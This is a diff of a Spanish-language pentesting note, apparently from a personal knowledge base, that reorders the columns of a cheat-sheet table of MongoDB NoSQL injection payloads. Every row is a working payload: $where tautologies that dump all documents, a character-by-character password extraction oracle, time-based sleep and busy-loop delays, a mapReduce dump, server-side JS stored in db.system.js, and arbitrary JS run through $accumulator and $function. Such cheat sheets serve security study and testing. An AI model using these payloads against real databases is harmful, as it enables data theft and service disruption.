@@ -24,16 +24,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|---|
-| **$where return true** | `{"$where":"return true"}` | Dump todos los docs. |
-| **$where custom filter** | `{"$where":"this.role=='admin'"}` | Filtrar por field arbitrario. |
-| **$where tautology** | `{"$where":"1==1"}` | Equivalente a return true, simple. |
-| **$where extracción blind** | `{"$where":"this.password.startsWith('a')"}` | Boolean oracle por char — ver [[NoSQLi - Extracción Blind]]. |
-| **$where time-based (v3.0)** | `{"$where":"sleep(5000) \|\| true"}` | MongoDB ≤3.0 tenía `sleep()`. |
-| **$where time-based (moderno)** | `{"$where":"function(){var d=Date.now();while(Date.now()-d<5000){}return true}()"}` | Busy-loop delay para versiones sin `sleep()`. |
-| **mapReduce classic (MongoDB ≤4.2)** | `db.users.mapReduce(function(){emit(this._id, this);}, function(k,v){return v;}, {out:"pwn"})` | Dump cross-collection. |
-| **db.system.js** | `db.system.js.save({_id:"shell",value:function(){...}})` | Guarda JS server-side para invocación posterior. |
-| **$accumulator (MongoDB 4.4+)** | `{"$accumulator":{"init":"function(){return {}}","accumulate":"function(s,v){...}","lang":"js"}}` | JS moderno en aggregation pipeline. |
-| **$function (MongoDB 4.4+)** | `{"$function":{"body":"function(){return this.role}","args":[],"lang":"js"}}` | Ejecuta JS arbitrario en pipeline. |
+| `{"$where":"return true"}` | **$where return true** | Dump todos los docs. |
+| `{"$where":"this.role=='admin'"}` | **$where custom filter** | Filtrar por field arbitrario. |
+| `{"$where":"1==1"}` | **$where tautology** | Equivalente a return true, simple. |
+| `{"$where":"this.password.startsWith('a')"}` | **$where extracción blind** | Boolean oracle por char — ver [[NoSQLi - Extracción Blind]]. |
+| `{"$where":"sleep(5000) \|\| true"}` | **$where time-based (v3.0)** | MongoDB ≤3.0 tenía `sleep()`. |
+| `{"$where":"function(){var d=Date.now();while(Date.now()-d<5000){}return true}()"}` | **$where time-based (moderno)** | Busy-loop delay para versiones sin `sleep()`. |
+| `db.users.mapReduce(function(){emit(this._id, this);}, function(k,v){return v;}, {out:"pwn"})` | **mapReduce classic (MongoDB ≤4.2)** | Dump cross-collection. |
+| `db.system.js.save({_id:"shell",value:function(){...}})` | **db.system.js** | Guarda JS server-side para invocación posterior. |
+| `{"$accumulator":{"init":"function(){return {}}","accumulate":"function(s,v){...}","lang":"js"}}` | **$accumulator (MongoDB 4.4+)** | JS moderno en aggregation pipeline. |
+| `{"$function":{"body":"function(){return this.role}","args":[],"lang":"js"}}` | **$function (MongoDB 4.4+)** | Ejecuta JS arbitrario en pipeline. |
 ^nosqli-js
 
 ---
